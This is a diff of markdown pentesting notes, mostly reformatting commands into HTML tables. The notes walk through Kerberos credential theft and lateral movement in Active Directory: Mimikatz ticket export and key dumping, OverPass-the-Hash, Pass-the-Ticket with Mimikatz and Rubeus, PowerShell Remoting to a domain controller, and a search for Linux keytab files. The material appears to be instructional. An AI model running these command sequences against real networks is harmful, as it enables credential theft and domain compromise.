+</td>
+</tr>
+</table>
 
 </details>
 
@@ -7133,10 +7380,10 @@ Registry Key:
 
 Configuration Options:
 
-| Value | Effect |
-|-------|--------|
+| Value       | Effect                                                                                          |
+| ----------- | ----------------------------------------------------------------------------------------------- |
 | 0 (Default) | Only the built-in local Administrator account (RID-500) can perform remote administration tasks |
-| 1 | All local administrator accounts can perform remote administration |
+| 1           | All local administrator accounts can perform remote administration                              |
 
 > **Note:** There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.
 
@@ -7155,8 +7402,8 @@ Configuration Options:
 
 Kerberos is a ticket-based authentication system designed to avoid sharing user passwords with every service. Instead of sending passwords, the system stores authentication tickets locally and provides each service only with the specific ticket it requires. This design ensures that tickets cannot be reused for other purposes.
 
-* The **Ticket Granting Ticket (TGT)** is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or **TGS**.
-* The **Ticket Granting Service (TGS)** is requested by users who want to use a service. These tickets allow services to verify the user's identity.
+- The **Ticket Granting Ticket (TGT)** is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or **TGS**.
+- The **Ticket Granting Service (TGS)** is requested by users who want to use a service. These tickets allow services to verify the user's identity.
 
 To obtain a **TGT**, the user authenticates to the domain controller by encrypting the current timestamp using their password hash. Since the domain controller knows the user's password hash, it can decrypt the timestamp to verify the user’s identity. Upon successful validation, the domain controller issues a **TGT**. From this point onward, the user does not need to use their password again during the session.
 
@@ -7169,8 +7416,8 @@ When the user wants to access a specific service—such as an MSSQL database—t
 
 We need a valid Kerberos ticket to perform a Pass the Ticket (PtT) attack. It can be:
 
-* Service Ticket (TGS) to allow access to a particular resource.
-* Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
+- Service Ticket (TGS) to allow access to a particular resource.
+- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
 
 Before we perform a **Pass the Ticket (PtT)** attack, let's see some methods to get a ticket using **Mimikatz** and **Rubeus**.
 
@@ -7197,26 +7444,78 @@ Windows processes Kerberos tickets via the LSASS (Local Security Authority Subsy
 <details>
 <summary><h5>Mimikatz - Export tickets</h5></summary>
 
-**Start Mimikatz as Adminitrator**
+1. **Start** Mimikatz as Administrator.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 mimikatz.exe
 ```
 
-**Export tickets**
+</td>
+</tr>
+</table>
 
-```cmd
-mimikatz # privilege::debug
-mimikatz # sekurlsa::tickets /export
-mimikatz # exit
+2. **Export** tickets.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🔑 <b>Mimikatz</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`mimikatz #`**
+
+</td>
+<td>
+
+```
+privilege::debug
+sekurlsa::tickets /export
+exit
 ```
 
-**Verify the new file**
+</td>
+</tr>
+</table>
+
+3. **Verify** the new files.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 dir *.kirbi
 ```
-```cmd
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 Directory: c:\Users\Public
 
 Mode                LastWriteTime         Length Name
@@ -7228,6 +7527,10 @@ Mode                LastWriteTime         Length Name
 -a----        7/12/2025   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.domain.local.kirbi
 ```
 
+</td>
+</tr>
+</table>
+
 The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.
 
 > **NOTE:** Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.
@@ -7237,11 +7540,27 @@ The tickets that end with $ correspond to the computer account, which needs a ti
 <details>
 <summary><h5>Rubeus - Export tickets</h5></summary>
 
-**Start Rubeus as Adminitrator**
+**Start** Rubeus as Administrator.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 Rubeus.exe dump /nowrap
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -7257,19 +7576,55 @@ To forge our tickets, we need to have the user's hash.
 <details>
 <summary><h5>Mimikatz - Extract Kerberos keys</h5></summary>
 
-**Start Mimikatz as Adminitrator**
+1. **Start** Mimikatz as Administrator.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 mimikatz.exe
 ```
 
-**Extract Kerberos keys**
+</td>
+</tr>
+</table>
 
-```cmd
-mimikatz # privilege::debug
-mimikatz # sekurlsa::ekeys
+2. **Extract** Kerberos keys.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🔑 <b>Mimikatz</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`mimikatz #`**
+
+</td>
+<td>
+
 ```
-```cmd
+privilege::debug
+sekurlsa::ekeys
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 Authentication Id : 0 ; 444066 (00000000:0006c6a2)
 Session           : Interactive from 1
 User Name         : <USER>
@@ -7290,6 +7645,10 @@ SID               : S-1-5-21-228825152-3134732153-3833540767-1107
            rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
 ```
 
+</td>
+</tr>
+</table>
+
 Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash aka. Pass the Key attack using Mimikatz and Rubeus.
 
 </details>
@@ -7297,19 +7656,55 @@ Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform
 <details>
 <summary><h5>Mimikatz - Pass the Key aka. OverPass the Hash</h5></summary>
 
-**Start Mimikatz as Adminitrator**
+1. **Start** Mimikatz as Administrator.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 mimikatz.exe
 ```
 
-**Extract Kerberos keys**
+</td>
+</tr>
+</table>
 
-```cmd
-mimikatz # privilege::debug
-mimikatz # sekurlsa::pth /domain:<corp.rth> /user:<USER> /ntlm:<NTLM_HASH>
+2. **Perform** the OverPass the Hash / Pass the Key attack.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🔑 <b>Mimikatz</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`mimikatz #`**
+
+</td>
+<td>
+
 ```
-```cmd
+privilege::debug
+sekurlsa::pth /domain:<corp.rth> /user:<USER> /ntlm:<NTLM_HASH>
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 user    : <USER>
 domain  : <corp.rth>
 program : cmd.exe
@@ -7331,6 +7726,10 @@ NTLM    : <NTLM_HASH>
    \_ *Password replace @ 000001C7E2136BC8 (32) -> null
 ```
 
+</td>
+</tr>
+</table>
+
 This will create a new **cmd.exe** window that we can use to request access to any service we want in the context of the target user.
 
 </details>
@@ -7338,11 +7737,27 @@ This will create a new **cmd.exe** window that we can use to request access to a
 <details>
 <summary><h5>Rubeus - Pass the Key aka. OverPass the Hash</h5></summary>
 
-**Start Rubeus**
+**Start** Rubeus to request a TGT.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 Rubeus.exe asktgt /domain:<corp.rth> /user:<USER> /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3Sfe60 /nowrap
 ```
+
+</td>
+</tr>
+</table>
 
 > **NOTE:** Rubeus doesn't require administrative rights to perform the Pass the Key.
 
@@ -7362,12 +7777,32 @@ Now that we have some Kerberos tickets, we can use them to move laterally within
 <details>
 <summary><h5>Rubeus - Pass the Ticket (OPTION 1)</h4></summary>
 
-After executing an OverPass‑the‑Hash attack, you may obtain the resulting ticket in Base64 format. Rather than manually exporting and importing it, you can use the */ptt* flag to automatically inject that ticket—whether it's a **TGT** or a **TGS**—into the current logon session.
+After executing an OverPass‑the‑Hash attack, you may obtain the resulting ticket in Base64 format. Rather than manually exporting and importing it, you can use the _/ptt_ flag to automatically inject that ticket—whether it's a **TGT** or a **TGS**—into the current logon session.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 Rubeus.exe asktgt /domain:<corp.rth> /user:<USER> /rc4:<HASH> /ptt
 ```
-```cmd
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
    ______        _
   (_____ \      | |
    _____) )_   _| |__  _____ _   _  ___
@@ -7398,6 +7833,10 @@ Rubeus.exe asktgt /domain:<corp.rth> /user:<USER> /rc4:<HASH> /ptt
   Base64(key)           :  PRG0wMmc4OznDz1YIAjdsA==
 ```
 
+</td>
+</tr>
+</table>
+
 Note that now it displays `Ticket successfully imported!`.
 
 </details>
@@ -7407,13 +7846,32 @@ Note that now it displays `Ticket successfully imported!`.
 
 Another way is to import the ticket into the current session using the .kirbi file from the disk.
 
+1. **Use** a ticket exported from Mimikatz and import it using Pass the Ticket.
 
-**Use a ticket exported from Mimikatz and import it using Pass the Ticket:**
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-<USER>@krbtgt-<corp.rth>.kirbi
 ```
-```cmd
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
  ______        _
 (_____ \      | |
  _____) )_   _| |__  _____ _   _  ___
@@ -7428,12 +7886,36 @@ v1.5.0
 [+] ticket successfully imported!
 ```
 
-**Verify that your ticket let you access DC01’s filesystem:**
+</td>
+</tr>
+</table>
+
+2. **Verify** that your ticket lets you access DC01's filesystem.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 dir \\DC01.<corp.rth>\c$
 ```
-```cmd
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 Directory: \\dc01.<corp.rth>\c$
 
 Mode                LastWriteTime         Length Name
@@ -7442,29 +7924,77 @@ d-r---         6/4/2025  11:17 AM                Program Files
 d-----         6/4/2025  11:17 AM                Program Files (x86)
 ...
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
 <details>
 <summary><h5>Rubeus - Pass the Ticket (OPTION 3)</h5></summary>
 
-We can also use the Base64 output from Rubeus or convert a .kirbi to Base64 to perform the Pass the Ticket attack. 
+We can also use the Base64 output from Rubeus or convert a .kirbi to Base64 to perform the Pass the Ticket attack.
 
-**Use PowerShell to convert a .kirbi to Base64:**
+1. **Convert** a .kirbi to Base64 using PowerShell.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-<USER>@krbtgt-<corp.rth>.kirbi"))
 ```
-```cmd
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 <BASE64_TICKET>
 ```
 
-**Using Rubeus, provide the Base64 string instead of the file name:**
+</td>
+</tr>
+</table>
+
+2. **Use** Rubeus, providing the Base64 string instead of the file name.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 Rubeus.exe ptt /ticket:<BASE64_TICKET>
 ```
-```cmd
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
  ______        _
 (_____ \      | |
  _____) )_   _| |__  _____ _   _  ___
@@ -7479,12 +8009,36 @@ v1.5.0
 [+] ticket successfully imported!
 ```
 
-**Verify that your ticket let you access DC01’s filesystem:**
+</td>
+</tr>
+</table>
+
+3. **Verify** that your ticket lets you access DC01's filesystem.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 dir \\DC01.<corp.rth>\c$
 ```
-```cmd
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 Directory: \\dc01.<corp.rth>\c$
 
 Mode                LastWriteTime         Length Name
@@ -7493,6 +8047,10 @@ d-r---         6/4/2025  11:17 AM                Program Files
 d-----         6/4/2025  11:17 AM                Program Files (x86)
 ...
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -7501,26 +8059,78 @@ d-----         6/4/2025  11:17 AM                Program Files (x86)
 
 We can also perform the **Pass the Ticket** attack using the Mimikatz module `kerberos::ptt` and the `.kirbi` file that contains the ticket we want to import.
 
-**Start Mimikatz as Adminitrator**
+1. **Start** Mimikatz as Administrator.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 mimikatz.exe
 ```
 
-**Perform the Pass the Ticket attack**
+</td>
+</tr>
+</table>
 
-```cmd
-mimikatz # privilege::debug
-mimikatz # kerberos::ptt "C:\Users\<USER>\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-<USER>@krbtgt-<corp.rth>.kirbi"
-mimikatz # exit
+2. **Perform** the Pass the Ticket attack.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🔑 <b>Mimikatz</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`mimikatz #`**
+
+</td>
+<td>
+
+```
+privilege::debug
+kerberos::ptt "C:\Users\<USER>\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-<USER>@krbtgt-<corp.rth>.kirbi"
+exit
 ```
 
-**Verify that your ticket let you access DC01’s filesystem:**
+</td>
+</tr>
+</table>
+
+3. **Verify** that your ticket lets you access DC01's filesystem.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 dir \\DC01.<corp.rth>\c$
 ```
-```cmd
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 Directory: \\dc01.<corp.rth>\c$
 
 Mode                LastWriteTime         Length Name
@@ -7529,6 +8139,10 @@ d-r---         6/4/2025  11:17 AM                Program Files
 d-----         6/4/2025  11:17 AM                Program Files (x86)
 ...
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -7539,14 +8153,14 @@ d-----         6/4/2025  11:17 AM                Program Files (x86)
 
 [PowerShell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/running-remote-commands?view=powershell-7.5&viewFallbackFrom=powershell-7.2) enables administrators to execute scripts or manage commands remotely on Windows systems. It's powered by WinRM, which operates using the WS‑Management (WS‑Man) protocol and listens on two primary ports:
 
-* **TCP 5985 for HTTP**
-* **TCP 5986 for HTTPS (SSL/TLS-secured)**
+- **TCP 5985 for HTTP**
+- **TCP 5986 for HTTPS (SSL/TLS-secured)**
 
 To initiate a PowerShell Remoting session on a remote system, a user must meet one of the following criteria:
 
-* Be a member of the local Administrators group
-* Belong to the Remote Management Users group
-* Have explicit permissions set on the session configuration within PowerShell
+- Be a member of the local Administrators group
+- Belong to the Remote Management Users group
+- Have explicit permissions set on the session configuration within PowerShell
 
 Suppose we find a user account that doesn't have administrative privileges on a remote computer but is a member of the Remote Management Users group. In that case, we can use PowerShell Remoting to connect to that computer and execute commands.
 
@@ -7555,40 +8169,107 @@ Suppose we find a user account that doesn't have administrative privileges on a 
 
 To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine.
 
-**Start Mimikatz as Adminitrator**
+1. **Start** Mimikatz as Administrator.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 mimikatz.exe
 ```
 
-**Perform the Pass the Ticket attack**
+</td>
+</tr>
+</table>
 
-```cmd
-mimikatz # privilege::debug
-mimikatz # kerberos::ptt "C:\Users\<USER>\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-<USER>@krbtgt-<corp.rth>.kirbi"
-mimikatz # exit
+2. **Import** the ticket.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🔑 <b>Mimikatz</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`mimikatz #`**
+
+</td>
+<td>
+
+```
+privilege::debug
+kerberos::ptt "C:\Users\<USER>\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-<USER>@krbtgt-<corp.rth>.kirbi"
+exit
 ```
 
-**Start PowerShell**
+</td>
+</tr>
+</table>
+
+3. **Start** PowerShell.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 powershell
 ```
 
-**Connect to the target machine**
+</td>
+</tr>
+</table>
+
+4. **Connect** to the target machine and verify your session.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
 Enter-PSSession -ComputerName DC01
-```
-
-**Verify your current session**
-
-```powershell
 whoami
 ```
-```powershell
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 <corp.rth>\<USER>
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -7599,12 +8280,32 @@ whoami
 
 Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). By default, the process is hidden; use the /show flag to display it. This prevents the erasure of existing TGTs for the current logon session.
 
-**Create a sacrificial process with Rubeus:**
+1. **Create** a sacrificial process with Rubeus.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
 ```
-```cmd
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
    ______        _
   (_____ \      | |
    _____) )_   _| |__  _____ _   _  ___
@@ -7629,6 +8330,10 @@ Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
 [+] LUID            : 0xe07648
 ```
 
+</td>
+</tr>
+</table>
+
 The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting.
 
 </details>
@@ -7636,10 +8341,32 @@ The above command will open a new cmd window. From that window, we can execute R
 <details>
 <summary><h4>Rubeus - Pass the Ticket for lateral movement</h4></summary>
 
+1. **Request** a TGT and inject it with Rubeus.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
+
 ```cmd
 Rubeus.exe asktgt /user:<USER> /domain:<corp.rth> /aes256:<AES_KEY> /ptt
 ```
-```powershell
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
    ______        _
   (_____ \      | |
    _____) )_   _| |__  _____ _   _  ___
@@ -7672,26 +8399,65 @@ Rubeus.exe asktgt /user:<USER> /domain:<corp.rth> /aes256:<AES_KEY> /ptt
   ASREP (key)              :  <AES_KEY>
 ```
 
-**Start PowerShell**
+</td>
+</tr>
+</table>
+
+2. **Start** PowerShell.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 powershell
 ```
 
-**Connect to the target machine**
+</td>
+</tr>
+</table>
+
+3. **Connect** to the target machine and verify your session.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
 Enter-PSSession -ComputerName DC01
-```
-
-**Verify your current session**
-
-```powershell
 whoami
 ```
-```powershell
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 <corp.rth>\<USER>
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -7700,10 +8466,9 @@ whoami
 <details>
 <summary><h3>PtT from Linux</h3></summary>
 
-If a Linux machine is joined to Active Directory and uses Kerberos for authentication, tickets might be stored in one of several ways—depending on configuration and tooling 
+If a Linux machine is joined to Active Directory and uses Kerberos for authentication, tickets might be stored in one of several ways—depending on configuration and tooling
 
 > **Note:** A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.
-
 
 <details>
 <summary><h4>Introduction</h4></summary>
@@ -7714,8 +8479,8 @@ Another everyday use of Kerberos in Linux is with [keytab](https://servicenow.iu
 
 Typical uses of keytab files include:
 
-* Letting services or scripts authenticate asutomatically to Kerberos without plain-text passwords or interactive login 
-* Enabling scheduled or background processes to access network resources (e.g., mounting SMB shares) via Kerberos.
+- Letting services or scripts authenticate asutomatically to Kerberos without plain-text passwords or interactive login
+- Enabling scheduled or background processes to access network resources (e.g., mounting SMB shares) via Kerberos.
 
 > **Note:** Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.
 
@@ -7731,93 +8496,141 @@ Typical uses of keytab files include:
 
 The [realm](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) utility is designed for domain discovery, enrollment, and managing which domain users or groups can access the local system.
 
-**Check if Linux machine is domain-joined:**
+**Check if Linux machine is domain-joined.**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`user@linux:~$`**
+
+</td>
+<td>
 
 ```bash
 realm list
 ```
-```bash
-# <corp.rth>
-#   type: kerberos
-#   realm-name: <CORP.RTH>
-#   domain-name: <corp.rth>
-#   configured: kerberos-member
-#   server-software: active-directory
-#   client-software: sssd
-#   required-package: sssd-tools
-#   required-package: sssd
-#   required-package: libnss-sss
-#   required-package: libpam-sss
-#   required-package: adcli
-#   required-package: samba-common-bin
-#   login-formats: %U@<corp.rth>
-#   login-policy: allow-permitted-logins
-#   permitted-logins: david@<corp.rth>, julio@<corp.rth>
-#   permitted-groups: Linux Admins
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
 ```
+<corp.rth>
+  type: kerberos
+  realm-name: <CORP.RTH>
+  domain-name: <corp.rth>
+  configured: kerberos-member
+  server-software: active-directory
+  client-software: sssd
+  required-package: sssd-tools
+  required-package: sssd
+  required-package: libnss-sss
+  required-package: libpam-sss
+  required-package: adcli
+  required-package: samba-common-bin
+  login-formats: %U@<corp.rth>
+  login-policy: allow-permitted-logins
+  permitted-logins: david@<corp.rth>, julio@<corp.rth>
+  permitted-groups: Linux Admins
+```
+
+</td>
+</tr>
+</table>
 
 **Key Findings from realm list**
 
 1. Domain Join Configuration
-    * Domain: domain
-    * Realm: DOMAIN (Kerberos realm)
-    * Type: kerberos
-    * Server Software: active-directory (Windows AD)
-    * Client Software: sssd (Linux-side authentication)
+   - Domain: domain
+   - Realm: DOMAIN (Kerberos realm)
+   - Type: kerberos
+   - Server Software: active-directory (Windows AD)
+   - Client Software: sssd (Linux-side authentication)
 
 2. Authentication Setup
-    * Required Packages:
-        * `sssd-tools`, `sssd` (core SSSD services)
-        * `libnss-sss` (Name Service Switch integration)
-        * `libpam-sss` (PAM module for AD logins)
-        * `adcli` (AD command-line tools)
-        * `samba-common-bin` (Samba utilities, though Winbind isn’t primary)
+   - Required Packages:
+     - `sssd-tools`, `sssd` (core SSSD services)
+     - `libnss-sss` (Name Service Switch integration)
+     - `libpam-sss` (PAM module for AD logins)
+     - `adcli` (AD command-line tools)
+     - `samba-common-bin` (Samba utilities, though Winbind isn’t primary)
 
 3. Login Policies
-    * Login Format: `user@domain`
-    * Explicitly allowed users:
-        * david@domain
-        * julio@domain
-    * Permitted Groups: `Linux Admins` (members of this AD group can log in)
+   - Login Format: `user@domain`
+   - Explicitly allowed users:
+     - david@domain
+     - julio@domain
+   - Permitted Groups: `Linux Admins` (members of this AD group can log in)
 
 </details>
 
 <details>
 <summary><h5>Option 2: PS</h5></summary>
 
-**Check if Linux machine is domain-joined:**
+**Check if Linux machine is domain-joined.**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`user@linux:~$`**
+
+</td>
+<td>
 
 ```bash
 ps -ef | grep -i "winbind\|sssd"
 ```
-```bash
-# root         847       1  0 15:33 ?        00:00:00 /usr/sbin/sssd -i --logger=files
-# root         997     847  0 15:33 ?        00:00:00 /usr/libexec/sssd/sssd_be --domain <corp.rth> --uid 0 --gid 0 --logger=files
-# root        1001     847  0 15:33 ?        00:00:00 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
-# root        1002     847  0 15:33 ?        00:00:00 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
-# root       11451       1  0 17:25 ?        00:00:00 /usr/libexec/sssd/sssd_pac --logger=files --socket-activated
-# david@i+   16815   16801  0 18:01 pts/0    00:00:00 grep --color=auto -i winbind\|sssd
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
 ```
+root         847       1  0 15:33 ?        00:00:00 /usr/sbin/sssd -i --logger=files
+root         997     847  0 15:33 ?        00:00:00 /usr/libexec/sssd/sssd_be --domain <corp.rth> --uid 0 --gid 0 --logger=files
+root        1001     847  0 15:33 ?        00:00:00 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
+root        1002     847  0 15:33 ?        00:00:00 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
+root       11451       1  0 17:25 ?        00:00:00 /usr/libexec/sssd/sssd_pac --logger=files --socket-activated
+david@i+   16815   16801  0 18:01 pts/0    00:00:00 grep --color=auto -i winbind\|sssd
+```
+
+</td>
+</tr>
+</table>
 
 **Key Findings from the ps Output**
 
 1. sssd (System Security Services Daemon) is Running
-    * `/usr/sbin/sssd -i`
-        * Main SSSD process
-    * `/usr/libexec/sssd/sssd_be`
-        * Backend service, handles AD/LDAP communication
-    * `/usr/libexec/sssd/sssd_nss`
-        * Name Service Switch integration for AD users/groups
-    * `/usr/libexec/sssd/sssd_pam`
-        * Pluggable Authentication Module for AD logins
-    * `/usr/libexec/sssd/sssd_pac`
-        * Handles Kerberos PAC validation for AD trusts
+   - `/usr/sbin/sssd -i`
+     - Main SSSD process
+   - `/usr/libexec/sssd/sssd_be`
+     - Backend service, handles AD/LDAP communication
+   - `/usr/libexec/sssd/sssd_nss`
+     - Name Service Switch integration for AD users/groups
+   - `/usr/libexec/sssd/sssd_pam`
+     - Pluggable Authentication Module for AD logins
+   - `/usr/libexec/sssd/sssd_pac`
+     - Handles Kerberos PAC validation for AD trusts
 
 2. Domain Configuration
-    * The `--domain` flag in `sssd_be` explicitly shows the AD domain this machine is joined to.
+   - The `--domain` flag in `sssd_be` explicitly shows the AD domain this machine is joined to.
 
 3. No `winbind` (Samba) Process
-    * The machine uses SSSD (not Samba/Winbind) for AD integration, which is common for modern Linux-AD joins.
+   - The machine uses SSSD (not Samba/Winbind) for AD integration, which is common for modern Linux-AD joins.
 
 </details>
 
@@ -7831,42 +8644,114 @@ On Linux domain-joined machines, we want to find Kerberos tickets to gain more a
 <details>
 <summary><h5>Finding KeyTab files</h5></summary>
 
-**Use Find to search for files with keytab in the name:**
+**Use Find to search for files with keytab in the name.**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`user@linux:~$`**
+
+</td>
+<td>
 
 ```bash
 find / -name *keytab* -ls 2>/dev/null
 ```
-```bash
-# 131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
-# 262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
